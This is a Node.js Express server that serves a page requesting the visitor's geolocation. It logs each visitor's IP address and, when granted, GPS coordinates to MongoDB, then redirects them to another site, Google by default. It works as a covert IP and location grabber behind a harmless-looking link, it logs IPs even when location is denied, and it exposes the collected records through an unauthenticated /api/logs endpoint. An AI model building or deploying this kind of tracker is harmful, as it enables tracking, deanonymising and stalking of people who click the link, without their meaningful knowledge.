const express = require('express');
const { MongoClient } = require('mongodb');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
const MONGODB_URI = process.env.MONGODB_URI || '';

// MongoDB connection
let db;
let logsCollection;

async function connectToDatabase() {
  if (MONGODB_URI) {
    try {
      const client = new MongoClient(MONGODB_URI);
      await client.connect();
      db = client.db('redirection-app');
      logsCollection = db.collection('visitor-logs');
      console.log('✅ Connected to MongoDB');
    } catch (error) {
      console.error('❌ MongoDB connection error:', error.message);
      console.log('⚠️  Falling back to console logging only');
    }
  } else {
    console.log('⚠️  No MONGODB_URI found - using console logging only');
    console.log('💡 Set MONGODB_URI environment variable to enable database logging');
  }
}

// Initialize database connection
connectToDatabase();

// Middleware to parse JSON
app.use(express.json());

// Serve the HTML page with location request
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// API endpoint to log IP and location data
app.post('/log', async (req, res) => {
  // Get IP address (handles proxies and direct connections)
  const ip = req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

  const { latitude, longitude, accuracy, denied } = req.body;
  const timestamp = new Date();

  // Create log document
  const logDocument = {
    ip: ip,
    timestamp: timestamp,
    denied: denied || false
  };

  if (latitude && longitude) {
    logDocument.location = {
      latitude: latitude,
      longitude: longitude,
      accuracy: accuracy
    };
  }

  // Log to console
  if (denied) {
    console.log(`🔍 IP: ${ip} | Location: DENIED`);
  } else if (latitude && longitude) {
    console.log(`🔍 IP: ${ip} | Location: ${latitude}, ${longitude}`);
  } else {
    console.log(`🔍 IP: ${ip} | Location: NOT AVAILABLE`);
  }

  // Save to MongoDB if connected
  if (logsCollection) {
    try {
      await logsCollection.insertOne(logDocument);
      console.log('💾 Saved to MongoDB');
    } catch (error) {
      console.error('❌ Error saving to MongoDB:', error.message);
    }
  }

  console.log(`↪️  Redirecting to: ${REDIRECT_URL}`);

  // Send redirect URL back to client
  res.json({ redirectUrl: REDIRECT_URL });
});

// API endpoint to view logs (optional - for debugging)
app.get('/api/logs', async (req, res) => {
  if (!logsCollection) {
    return res.json({ error: 'Database not connected', logs: [] });
  }

  try {
    const logs = await logsCollection
      .find({})
      .sort({ timestamp: -1 })
      .limit(100)
      .toArray();
    res.json({ count: logs.length, logs: logs });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Redirection app running on port ${PORT}`);
  console.log(`📍 Redirecting all traffic to: ${REDIRECT_URL}`);
  if (MONGODB_URI) {
    console.log(`📊 Logging to MongoDB database`);
  } else {
    console.log(`📝 Console logging only (set MONGODB_URI for database logging)`);
  }
  console.log(`\n💡 To change redirect URL, set REDIRECT_URL environment variable`);
  console.log(`   Example: REDIRECT_URL=https://example.com npm start\n`);
});
